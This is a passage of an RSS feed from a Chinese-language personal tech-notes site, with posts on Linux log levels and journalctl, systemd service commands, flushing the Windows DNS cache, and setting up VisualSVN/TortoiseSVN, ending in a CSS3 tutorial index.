class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>系统日志</title>
      <link>https://sankgao.github.io/computers/linux/system_log.html</link>
      <guid>https://sankgao.github.io/computers/linux/system_log.html</guid>
      <source url="https://sankgao.github.io/rss.xml">系统日志</source>
      <description>Linux 系统日志级别 在 rsyslog 服务程序中，日志根据重要程度被分为了九个等级，这样我们不必被海啸般的输出内容淹没，可以直接看最重要的内容。 日志等级 说明介绍 :----: :---- emerg 系统出现严重故障，内核崩溃等情况 alert 应立即修复的故障，数据库损坏等情况 crit 危险较高的故障，硬盘损坏导致程序运行失败的情况 e...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> Linux 系统日志级别</h2>
<p>在 <code>rsyslog</code> 服务程序中，日志根据重要程度被分为了九个等级，这样我们不必被海啸般的输出内容淹没，可以直接看最重要的内容。</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志等级</th>
<th style="text-align:left">说明介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>emerg</code></td>
<td style="text-align:left">系统出现严重故障，内核崩溃等情况</td>
</tr>
<tr>
<td style="text-align:center"><code>alert</code></td>
<td style="text-align:left">应立即修复的故障，数据库损坏等情况</td>
</tr>
<tr>
<td style="text-align:center"><code>crit</code></td>
<td style="text-align:left">危险较高的故障，硬盘损坏导致程序运行失败的情况</td>
</tr>
<tr>
<td style="text-align:center"><code>err</code></td>
<td style="text-align:left">一般危险的故障，某个服务启动或运行失败的情况</td>
</tr>
<tr>
<td style="text-align:center"><code>warning</code></td>
<td style="text-align:left">警告信息，某个服务参数或功能错误的情况</td>
</tr>
<tr>
<td style="text-align:center"><code>notice</code></td>
<td style="text-align:left">一般无危险的故障，只是需要处理的情况</td>
</tr>
<tr>
<td style="text-align:center"><code>info</code></td>
<td style="text-align:left">通用性消息，给用户提升一些有用信息</td>
</tr>
<tr>
<td style="text-align:center"><code>debug</code></td>
<td style="text-align:left">调试程序所产生的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>none</code></td>
<td style="text-align:left">没有优先级，不做日志记录</td>
</tr>
</tbody>
</table>
<h2> Linux 常见的日志文件保存路径</h2>
<p>从理论上讲，日志文件分为三种类型：</p>
<ul>
<li><strong>系统日志</strong>：主要记录系统的运行情况和内核信息</li>
<li><strong>用户日志</strong>：主要记录用户的访问信息，包含用户名、终端名称、时间、来源和执行过的操作等信息</li>
<li><strong>程序日志</strong>：主要记录着服务运行过程中各种事件的信息，每个服务程序自己有独立的日志文件，但是格式相差的比较大，一般稍微大一些的服务都会保存一份与其同名的日志文件</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">文件路径</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/var/log/boot.log</code></td>
<td style="text-align:left">系统开机自检事件及引导过程等信息</td>
</tr>
<tr>
<td style="text-align:center"><code>/var/log/lastlog</code></td>
<td style="text-align:left">用户登录成功时间、终端名称及 IP 地址等信息</td>
</tr>
<tr>
<td style="text-align:center"><code>/var/log/btmp</code></td>
<td style="text-align:left">记录登录失败的时间、终端名称及 IP 地址等信息</td>
</tr>
<tr>
<td style="text-align:center"><code>/var/log/messages</code></td>
<td style="text-align:left">系统及各个服务的运行和报错信息</td>
</tr>
<tr>
<td style="text-align:center"><code>/var/log/secure</code></td>
<td style="text-align:left">系统安全相关的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>/var/log/wtmp</code></td>
<td style="text-align:left">系统启动与关机等相关信息</td>
</tr>
</tbody>
</table>
<h2> journalctl</h2>
<p><code>journalctl</code> 用于检索个管理系统日志信息，可以根据事件、类型、服务名等信息进行信息检索，大大的提高了日常排错的效率。语法格式：<code>journalctl [参数]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-k</code></td>
<td style="text-align:left">内核日志</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">启动日志</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">指定服务</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">指定条数</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">指定日志等级类型</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">实时刷新（追踪日志）</td>
</tr>
<tr>
<td style="text-align:center"><code>--since</code></td>
<td style="text-align:left">指定时间</td>
</tr>
<tr>
<td style="text-align:center"><code>--disk-usage</code></td>
<td style="text-align:left">占用空间</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>系统服务命令</title>
      <link>https://sankgao.github.io/computers/linux/system_service.html</link>
      <guid>https://sankgao.github.io/computers/linux/system_service.html</guid>
      <source url="https://sankgao.github.io/rss.xml">系统服务命令</source>
      <description>初始化进程 System V init 运行级别 Systemd 目标名称 Systemd 目标作用 :----: :----: :----: 0 poweroff.target 关机 1 rescue.target 单用户模式 2 multi-user.target 多用户的文本界面 3 multi-user.target 多用户的文本界面 4 mu...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 初始化进程</h2>
<table>
<thead>
<tr>
<th style="text-align:center">System V init 运行级别</th>
<th style="text-align:center">Systemd 目标名称</th>
<th style="text-align:center">Systemd 目标作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>0</code></td>
<td style="text-align:center"><code>poweroff.target</code></td>
<td style="text-align:center">关机</td>
</tr>
<tr>
<td style="text-align:center"><code>1</code></td>
<td style="text-align:center"><code>rescue.target</code></td>
<td style="text-align:center">单用户模式</td>
</tr>
<tr>
<td style="text-align:center"><code>2</code></td>
<td style="text-align:center"><code>multi-user.target</code></td>
<td style="text-align:center">多用户的文本界面</td>
</tr>
<tr>
<td style="text-align:center"><code>3</code></td>
<td style="text-align:center"><code>multi-user.target</code></td>
<td style="text-align:center">多用户的文本界面</td>
</tr>
<tr>
<td style="text-align:center"><code>4</code></td>
<td style="text-align:center"><code>multi-user.target</code></td>
<td style="text-align:center">多用户的文本界面</td>
</tr>
<tr>
<td style="text-align:center"><code>5</code></td>
<td style="text-align:center"><code>graphical.target</code></td>
<td style="text-align:center">多用户的图形界面</td>
</tr>
<tr>
<td style="text-align:center"><code>6</code></td>
<td style="text-align:center"><code>reboot.target</code></td>
<td style="text-align:center">重启</td>
</tr>
<tr>
<td style="text-align:center"><code>7</code></td>
<td style="text-align:center"><code>emergency.target</code></td>
<td style="text-align:center">救援模式</td>
</tr>
</tbody>
</table>
<h2> 服务启动等常用命令</h2>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>RHEL 5/6</code> 系统使用 <code>service</code>、<code>chkconfig</code> 等命令来管理系统服务；<code>RHEL 7/8</code> 系统使用 <code>systemctl</code> 命令来管理系统服务</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">RHEL 5/6 系统</th>
<th style="text-align:center">RHEL 7/8 系统</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>service foo start</code></td>
<td style="text-align:center"><code>systemctl start httpd</code></td>
<td style="text-align:center">启动服务</td>
</tr>
<tr>
<td style="text-align:center"><code>service foo restart</code></td>
<td style="text-align:center"><code>systemctl restart httpd</code></td>
<td style="text-align:center">重启服务</td>
</tr>
<tr>
<td style="text-align:center"><code>service foo stop</code></td>
<td style="text-align:center"><code>systemctl stop httpd</code></td>
<td style="text-align:center">停止服务</td>
</tr>
<tr>
<td style="text-align:center"><code>service foo reload</code></td>
<td style="text-align:center"><code>systemctl reload httpd</code></td>
<td style="text-align:center">重新加载配置文件（不终止服务）</td>
</tr>
<tr>
<td style="text-align:center"><code>service foo status</code></td>
<td style="text-align:center"><code>systemctl status httpd</code></td>
<td style="text-align:center">查看服务状态</td>
</tr>
</tbody>
</table>
<h2> 服务开机启动等常用命令</h2>
<table>
<thead>
<tr>
<th style="text-align:center">RHEL 5/6 系统</th>
<th style="text-align:center">RHEL 7/8 系统</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>chkconfig foo on</code></td>
<td style="text-align:center"><code>systemctl enable httpd</code></td>
<td style="text-align:center">开机自动启动</td>
</tr>
<tr>
<td style="text-align:center"><code>chkconfig foo off</code></td>
<td style="text-align:center"><code>systemctl disable httpd</code></td>
<td style="text-align:center">开机不自动启动</td>
</tr>
<tr>
<td style="text-align:center"><code>chkconfig foo</code></td>
<td style="text-align:center"><code>systemctl is-enabled httpd</code></td>
<td style="text-align:center">查看特定服务是否为开机自启动</td>
</tr>
<tr>
<td style="text-align:center"><code>chkconfig --list</code></td>
<td style="text-align:center"><code>systemctl list-unit-files-type=httpd</code></td>
<td style="text-align:center">查看各个级别下服务的启动与禁用情况</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>Windows</title>
      <link>https://sankgao.github.io/computers/windows/</link>
      <guid>https://sankgao.github.io/computers/windows/</guid>
      <source url="https://sankgao.github.io/rss.xml">Windows</source>
      <description>记录一些 Windows 操作系统相关的信息。</description>
      <category>Computer</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 Windows 操作系统相关的信息。</p>
<!-- more -->
<h2> Windows</h2>
<ul>
<li><a href="/computers/windows/site_not_secure.html" target="blank">网页提示此站点不安全</a></li>
<li><a href="/computers/windows/github_loading.html" target="blank">加载 GitHub 问题</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>网页提示此站点不安全</title>
      <link>https://sankgao.github.io/computers/windows/site_not_secure.html</link>
      <guid>https://sankgao.github.io/computers/windows/site_not_secure.html</guid>
      <source url="https://sankgao.github.io/rss.xml">网页提示此站点不安全</source>
      <description>问题 电脑可以正常上网，但部分网站或网页打不开，提示 您与此网站之间建立的连接不安全，无法加载网页。 站点不安全 解决方法 很有可能是本地 DNS 缓存错误造成的，刷新本地 DNS 缓存。 电脑中的 DNS 缓存存储了最近访问过的域名和其对应的 IP 地址。如果缓存中存在错误的或过期的记录，电脑就会出现 DNS 错误。这可能是由于域名信息的更改或 DN...</description>
      <category>Computer</category>
      <pubDate>Tue, 04 Jul 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 问题</h2>
<p>电脑可以正常上网，但部分网站或网页打不开，提示 <strong>您与此网站之间建立的连接不安全</strong>，无法加载网页。</p>
<figure><figcaption>站点不安全</figcaption></figure>
<h2> 解决方法</h2>
<p>很有可能是本地 DNS 缓存错误造成的，刷新本地 DNS 缓存。</p>
<p>电脑中的 DNS 缓存存储了最近访问过的域名和其对应的 IP 地址。如果缓存中存在错误的或过期的记录，电脑就会出现 DNS 错误。这可能是由于域名信息的更改或 DNS 缓存未及时更新所致。</p>
<ol>
<li>
<p>在 Windows 中按 <kbd>Win</kbd> + <kbd>R</kbd> 键，在运行中输入 <code>cmd</code> 打开终端控制器</p>
<figure><figcaption>终端控制器</figcaption></figure>
</li>
<li>
<p>在终端控制器中输入 <code>ipconfig /flushdns</code> 命令，刷新 DNS 解析缓存</p>
<figure><figcaption>ipconfig /flushdns</figcaption></figure>
<p>当访问一个网站时，系统将从 DNS 缓存中读取该域名所对应的 IP 地址，当查找不到时就会到系统中查找 hosts 文件，如果还没有那么才会向 DNS 服务器请求一个 DNS 查询，DNS 服务器将返回该域名所对应的 IP，在您的系统收到解析地址以后将使用该 IP 地址进行访问，同时将解析缓存到本地的 DNS 缓存中。</p>
<p>如果 DNS 地址无法解析或者是 DNS 缓存中的地址错误，一般才会使用 <code>ipconfig /flushdns</code> 命令来清除所有的 DNS 缓存。</p>
</li>
<li>
<p>再次访问网页，就可以成功访问</p>
</li>
</ol>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>按 <kbd>F5</kbd> 键刷新网页，只对当前页面进行刷新，只刷新本地缓存；按 <kbd>Ctrl</kbd> + <kbd>F5</kbd> 键强制刷新网页，会把本地缓存文件删除再重新从服务器下载</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>SVN</title>
      <link>https://sankgao.github.io/devops/svn/</link>
      <guid>https://sankgao.github.io/devops/svn/</guid>
      <source url="https://sankgao.github.io/rss.xml">SVN</source>
      <description>记录一些 SVN 相关的信息。</description>
      <category>DevOps</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 SVN 相关的信息。</p>
<!-- more -->
<h2> SVN</h2>
<ul>
<li><a href="/devops/svn/svn.html" target="blank">SVN</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>SVN</title>
      <link>https://sankgao.github.io/devops/svn/svn.html</link>
      <guid>https://sankgao.github.io/devops/svn/svn.html</guid>
      <source url="https://sankgao.github.io/rss.xml">SVN</source>
      <description>简介 SVN（Subversion） (https://subversion.apache.org/) 是一个自由开源的版本控制系统。SVN 采用客户端/服务器体系，项目的各种版本都存储在服务器上，程序开发人员首先将从服务器上获得一份项目的最新版本，并将其复制到本机，然后在此基础上，每个开发人员可以在自己的客户端进行独立的开发工作，并且可以随时将新代码...</description>
      <category>Tools</category>
      <pubDate>Fri, 28 Jul 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 简介</h2>
<p><strong><a href="https://subversion.apache.org/" target="_blank" rel="noopener noreferrer">SVN（Subversion）</a></strong> 是一个自由开源的版本控制系统。SVN 采用客户端/服务器体系，项目的各种版本都存储在服务器上，程序开发人员首先将从服务器上获得一份项目的最新版本，并将其复制到本机，然后在此基础上，每个开发人员可以在自己的客户端进行独立的开发工作，并且可以随时将新代码提交给服务器。当然也可以通过更新操作获取服务器上的最新代码，从而保持与其他开发者所使用版本的一致性。</p>
<h2> VisualSVN</h2>
<h3> 安装服务端</h3>
<p><code>Windows</code> 上安装 <a href="https://subversion.apache.org/packages.html#windows" target="_blank" rel="noopener noreferrer">VisualSVN</a> 服务端，按照步骤进行安装。其它操作系统找到相应位置进行下载。</p>
<ol>
<li>
<p>点击 <code>Next</code></p>
<figure><figcaption>visualsvn_01</figcaption></figure>
</li>
<li>
<p>勾选接受许可协议中的条款</p>
<figure><figcaption>visualsvn_02</figcaption></figure>
</li>
<li>
<p>选择要安装的组件</p>
<figure><figcaption>visualsvn_03</figcaption></figure>
<ul>
<li><strong>visualsvn server and administration tools</strong>：VisualSVN 服务器和管理工具</li>
<li><strong>administration tools only</strong>：仅限管理工具</li>
<li><strong>add subversion command-line tools to the PATH environment variable</strong>：将 Subversion 命令行工具添加到 <code>PATH</code> 环境变量</li>
</ul>
</li>
<li>
<p>修改配置</p>
<figure><figcaption>visualsvn_04</figcaption></figure>
<ul>
<li><strong>Location</strong>：安装位置</li>
<li><strong>Repo stories</strong>：SVN 仓库位置</li>
<li><strong>Server Port</strong>：端口。后面是否使用安全链接</li>
<li><strong>Backups</strong>：备份文件位置</li>
</ul>
</li>
<li>
<p>配置存储库搜索索引，最好在安装位置下面</p>
<figure><figcaption>visualsvn_05</figcaption></figure>
</li>
<li>
<p>身份认证模式</p>
<figure><figcaption>visualsvn_06</figcaption></figure>
<ul>
<li><strong>Use Subversion authentication</strong>：使用 Subversion 身份验证</li>
<li><strong>Use Windows authentication(recommended for Active Directory environments)</strong>：使用 Windows 身份验证（建议用于 Active Directory 环境）</li>
</ul>
</li>
<li>
<p>许可证（VisualSVN Server 是免费的，而 VisualSVN 是收费的）</p>
<figure><figcaption>visualsvn_07</figcaption></figure>
</li>
<li>
<p>开始安装</p>
<figure><figcaption>visualsvn_08</figcaption></figure>
</li>
</ol>
<h3> 新建存储库</h3>
<ol>
<li>
<p>右键 <code>Repositores</code> 新建存储库</p>
<figure><figcaption>visualsvn_09</figcaption></figure>
</li>
<li>
<p>选择存储库类型</p>
<figure><figcaption>visualsvn_10</figcaption></figure>
<ul>
<li><strong>Regular FSFS repository</strong>：常规 FSFS 存储库</li>
<li><strong>Dstributed VDFS repository</strong>：分布式 VDFS 存储库</li>
</ul>
</li>
<li>
<p>创建存储库名称</p>
<figure><figcaption>visualsvn_11</figcaption></figure>
</li>
<li>
<p>选择存储库结构</p>
<figure><figcaption>visualsvn_12</figcaption></figure>
<ul>
<li><strong>Empty repository(recommended option)</strong>：空存储库（推荐选项）</li>
<li><strong>single-project repostory(with the top-evel 'trunk','branches'and'tags'folders)</strong>：单个项目仓库（带有顶级的 “主干”、“分支” 和 “标签” 文件夹）</li>
</ul>
</li>
<li>
<p>选择存储库访问权限</p>
<figure><figcaption>visualsvn_13</figcaption></figure>
<ul>
<li><strong>Nobody has access</strong>：没有人可以访问</li>
<li><strong>All Subversion users have Read/Write acess</strong>：所有 Subversion 用户都具有读/写权限</li>
<li><strong>Customize permissions</strong>：自定义权限</li>
</ul>
</li>
<li>
<p>是否运行存储库搜索索引</p>
<figure><figcaption>visualsvn_14</figcaption></figure>
</li>
<li>
<p>创建完成</p>
<figure><figcaption>visualsvn_15</figcaption></figure>
</li>
</ol>
<h3> 创建用户和组</h3>
<ol>
<li>
<p>右键 <code>Users</code> 新建用户</p>
<figure><figcaption>visualsvn_16</figcaption></figure>
</li>
<li>
<p>输入用户名和密码</p>
<figure><figcaption>visualsvn_17</figcaption></figure>
<ul>
<li><strong>User name</strong>：用户名</li>
<li><strong>Password</strong>：密码</li>
<li><strong>Confirm password</strong>：确认密码</li>
</ul>
</li>
<li>
<p>右键 <code>Groups</code> 新建用户组</p>
<figure><figcaption>visualsvn_18</figcaption></figure>
</li>
<li>
<p>输入组名，点击 <code>Add</code> 选择用户添加到这个组中</p>
<figure><figcaption>visualsvn_19</figcaption></figure>
</li>
</ol>
<h3> 给用户组设置权限</h3>
<ol>
<li>
<p>右键刚才创建的存储库，选择 <code>Properties</code>。</p>
<figure><figcaption>visualsvn_20</figcaption></figure>
</li>
<li>
<p>设置只有 <code>admins</code> 组成员可以访问</p>
<p>选择 <code>Security</code> 选项，点击 <code>Add</code> 添加 <code>admins</code> 组，并移除 <code>Everyone</code>。</p>
<figure><figcaption>visualsvn_21</figcaption></figure>
</li>
</ol>
<h2> TortoiseSVN</h2>
<h3> 安装客户端</h3>
<p><code>Windows</code> 上安装 <a href="https://subversion.apache.org/packages.html#windows" target="_blank" rel="noopener noreferrer">TortoiseSVN</a> 客户端，按照步骤进行安装。其它操作系统找到相应位置进行下载。</p>
<ol>
<li>
<p>点击 <code>Next</code></p>
<figure><figcaption>tortoisesvn_01</figcaption></figure>
<figure><figcaption>tortoisesvn_02</figcaption></figure>
</li>
<li>
<p>自定义安装</p>
<figure><figcaption>tortoisesvn_03</figcaption></figure>
</li>
<li>
<p>是否选择使用命令行操作</p>
<p><code>command line dient tools</code> 建议安装，如果不安装则之后在 <code>IDEA</code> 里面配置时找不到 <code>svn.exe</code> 文件</p>
<figure><figcaption>tortoisesvn_04</figcaption></figure>
<ul>
<li><strong>Will be installed on local hard drive</strong>：将安装在本地硬盘上</li>
<li><strong>Entire feature will be installed don local hard drive</strong>：整个功能将安装在本地硬盘上</li>
<li><strong>Feature will be installed when required</strong>：功能将在需要时安装</li>
<li><strong>Entire feature will be unavailable</strong>：整个功能将不可用</li>
</ul>
</li>
<li>
<p>开始安装</p>
<figure><figcaption>tortoisesvn_05</figcaption></figure>
</li>
</ol>
<h3> 浏览仓库</h3>
<ol>
<li>
<p>点击鼠标右键，选择 <strong>TortoiseSVN -&gt; Repo-browser</strong></p>
<figure><figcaption>tortoisesvn_06</figcaption></figure>
</li>
<li>
<p>输入要访问的仓库 URL</p>
<figure><figcaption>tortoisesvn_07</figcaption></figure>
</li>
<li>
<p>进行认证</p>
<p>由于这个仓库设置了只有 <code>admins</code> 组的用户才可以访问，输入 <code>admins</code> 组中一个用户名和密码进行认证。</p>
<figure><figcaption>tortoisesvn_08</figcaption></figure>
</li>
<li>
<p>查看仓库</p>
<figure><figcaption>tortoisesvn_09</figcaption></figure>
<p>这个仓库还没有添加任何文件。</p>
</li>
</ol>
<h3> 将仓库 checkout 到本地</h3>
<ol>
<li>
<p>点击鼠标右键，选择 <strong>SVN Checkout</strong></p>
<figure><figcaption>tortoisesvn_10</figcaption></figure>
</li>
<li>
<p>选择要 <code>checkout</code> 的仓库</p>
<figure><figcaption>tortoisesvn_11</figcaption></figure>
<ul>
<li><strong>URL of repository</strong>：要 <code>checkout</code> 的仓库 URL</li>
<li><strong>Checkout directory</strong>：存放到本地的位置</li>
<li><strong>Revision</strong>：仓库版本</li>
</ul>
<p>由于这个仓库没有任何文件，所以 <code>checkout</code> 到本地后只有一个 <code>.svn</code> 隐藏文件。<code>.svn</code> 用于保存文件或文件夹版本状态等数据</p>
<figure><figcaption>tortoisesvn_12</figcaption></figure>
</li>
</ol>
<h3> 创建文件并 commit 到 SVN</h3>
<ol>
<li>
<p>创建一个文件</p>
<figure><figcaption>tortoisesvn_13</figcaption></figure>
</li>
<li>
<p>添加文件</p>
<p>选中添加的文件，右键选择 <strong>TortoiseSVN -&gt; Add。</strong></p>
<figure><figcaption>tortoisesvn_14</figcaption></figure>
</li>
<li>
<p>提交到 SVN</p>
<p>添加文件后，右键选择 <strong>SVN Commit。</strong></p>
<figure><figcaption>tortoisesvn_15</figcaption></figure>
<p>在 Message 中填入提交的描述信息，方便以后查看 log 日志。</p>
<figure><figcaption>tortoisesvn_16</figcaption></figure>
</li>
<li>
<p>完成提交</p>
<p>提交后文件标识会变成绿色。</p>
<figure><figcaption>tortoisesvn_17</figcaption></figure>
<p>服务端刷新后也会有对应的文件。</p>
<figure><figcaption>tortoisesvn_18</figcaption></figure>
</li>
</ol>
<h3> Update 操作</h3>
<p><code>checkout</code> 仓库到本地后，每次操作这个仓库前都需要 <code>Update</code> 一下，将 SVN 服务器上的内容更新到本地。</p>
<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>如果不进行 <code>Update</code> 操作，如果修改文件时，可能会将其它人做过的修改进行覆盖</p>
</div>
<h3> Delete 操作</h3>
<p>选择要删除的文件或文件夹，右键选择 <strong>TortoiseSVN -&gt; Delete</strong> 标记删除，这时只是在本地文件删除，还需要进行 <code>commit</code> 操作，SVN 服务端上文件才会删除。</p>
<h3> 提交冲突</h3>
<p>当多个用户同时操作同一个文件，其他人比自己先 <code>commit</code> 到 SVN 服务器上，自己再 <code>commit</code> 时
当多个用户同时操作同一个文件，自己进行 <code>commit</code> 到 SVN 服务器上，但有其他人提前进行 <code>commit</code> 操作时，就会产生冲突情况。</p>
<p>这时可以采用手动 <code>Merge</code>，解决冲突后，重新进行 <code>commit</code> 操作。</p>
<p>例如：<code>test.txt</code> 文件产生冲突。在进行 <code>commit</code> 操作后，提示 <code>Commit Failed!</code> 后会产生以下文件：</p>
<ul>
<li><strong>test.txt</strong>：SVN 服务器上的文件和本地文件合并后，产生的文件</li>
<li><strong>text.txt.mine</strong>：本地修改后的文件</li>
<li><strong>text.txt.r4</strong>：修改前的文件</li>
<li><strong>text.txt.r5</strong>：其他人修改后的文件</li>
</ul>
<p>选择产生冲突的文件，右键选择 <strong>TortoiseSVN -&gt; Edit conflicts</strong>，手动 <code>merge</code> 后再次 <code>commit</code>。</p>
<h3> 查看 log 日志</h3>
<p>选中仓库，或仓库中的某个文件，右键选择 <strong>TortoiseSVN -&gt; Show log。</strong></p>
<h3> 回退版本</h3>
<p>如果想要回退到之前的版本，选中要回退的文件，右键选择 <strong>TortoiseSVN -&gt; Update to revision</strong>，点击 <code>Show log</code> 查看具体要回退到哪个版本。</p>
<h2> VS Code 配置 SVN</h2>
<ol>
<li>
<p>本地提前安装 <a href="#%E5%AE%89%E8%A3%85%E5%AE%A2%E6%88%B7%E7%AB%AF">TortoiseSVN</a> 客户端</p>
</li>
<li>
<p><code>VS Code</code> 安装 SVN 插件</p>
</li>
<li>
<p>配置 SVN 路径</p>
<p>打开 <code>VS Code</code> 设置或使用快捷键 <kbd>Ctrl</kbd> + <kbd>,</kbd> 打开。</p>
<p>在搜索框中输入 <code>svn:path</code>，在 <code>settin.json</code> 文件中修改。将本地安装的 <code>TortoiseSVN</code> 路径输入到对应的位置。</p>
<div class="language-json line-numbers-mode" data-ext="json"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果在本地安装的 <code>TortoiseSVN\bin</code> 下找不到 <code>svn.exe</code> 文件。找到 <code>TortoiseSVN</code> 包进行 <code>Modify</code> 修改包，如果</p>
<p>依次点击 <strong>控制面板 -&gt; 程序和功能</strong>，找到 <code>TortoiseSVN</code> 包进行 <code>Modify</code> 修改，修改 <code>Command line tools</code> 选项。参考：<a href="#%E5%AE%89%E8%A3%85%E5%AE%A2%E6%88%B7%E7%AB%AF">安装客户端中的第三项（3.）</a></p>
</div>
</li>
<li>
<p>重新打开 <code>VS Code</code>，SVN 配置生效</p>
</li>
</ol>
<h3> SVN 命令</h3>
<ol>
<li>
<p>将仓库 <code>checkout</code> 到本地</p>
<p><code>svn checkout &lt;URL&gt;</code>。简写：<code>svn co &lt;URL&gt;</code></p>
<p><code>URL</code>：仓库地址。</p>
</li>
<li>
<p>添加新文件或文件夹</p>
<p><code>svn add &lt;file/dir&gt;</code>。</p>
</li>
<li>
<p>提交到 SVN 服务器</p>
<p><code>svn commit -m "messages"</code>。简写：<code>svn ci -m "messages"</code></p>
<p><code>messages</code>：描述信息。</p>
</li>
<li>
<p>删除文件或文件夹</p>
<p><code>svn delete &lt;file/dir&gt;</code>。</p>
</li>
<li>
<p>更新仓库</p>
<p><code>svn update</code>。</p>
</li>
<li>
<p>查看 log 日志</p>
<p><code>svn log &lt;file/dir&gt;</code> 显示文件或文件夹所有修改记录。</p>
<p><code>svn log -v &lt;file/dir&gt;</code> 显示文件或文件夹所有修改记录详细信息。</p>
<p><code>svn log -v -r &lt;num&gt; &lt;file/dir&gt;</code> 显示文件或文件夹某个版本的修改记录详细信息。</p>
<p><code>num</code>：版本号。</p>
</li>
<li>
<p>查看文件或文件夹详细信息</p>
<p><code>svn info &lt;file/dir&gt;</code>。</p>
</li>
<li>
<p>比较差异</p>
<p><code>svn diff -r &lt;num&gt; &lt;file/dir&gt;</code> 比较本地文件或文件夹和某个版本之间的差异。</p>
<p><code>svn diff -r &lt;num:num&gt; &lt;file/dir&gt;</code> 比较本地文件或文件夹和某两个版本之间的差异。</p>
<p><code>num</code>：版本号。</p>
</li>
<li>
<p>查看仓库下的文件和目录列表</p>
<p><code>svn list &lt;URL&gt;</code>。</p>
<p><code>URL</code>：仓库地址。</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>CSS3</title>
      <link>https://sankgao.github.io/languages/css3/</link>
      <guid>https://sankgao.github.io/languages/css3/</guid>
      <source url="https://sankgao.github.io/rss.xml">CSS3</source>
      <description>记录一些 CSS3 相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 CSS3 相关的信息。</p>
<!-- more -->
<h2> CSS3</h2>
<h3> 基础教程</h3>
<ul>
<li><a href="/languages/css3/tutorial/introduction.html" target="blank">简介</a></li>
<li><a href="/languages/css3/tutorial/syntax.html" target="blank">语法</a></li>
<li><a href="/languages/css3/tutorial/selectors.html" target="blank">选择器</a></li>
<li><a href="/languages/css3/tutorial/methods.html" target="blank">添加 CSS 方法</a></li>
<li><a href="/languages/css3/tutorial/comments.html" target="blank">注释</a></li>
<li><a href="/languages/css3/tutorial/colors.html" target="blank">颜色</a></li>
<li><a href="/languages/css3/tutorial/background.html" target="blank">背景</a></li>
<li><a href="/languages/css3/tutorial/border.html" target="blank">边框</a></li>
<li><a href="/languages/css3/tutorial/margin.html" target="blank">外边距</a></li>
<li><a href="/languages/css3/tutorial/padding.html" target="blank">内边距</a></li>
<li><a href="/languages/css3/tutorial/dimension.html" target="blank">高度和宽度</a></li>
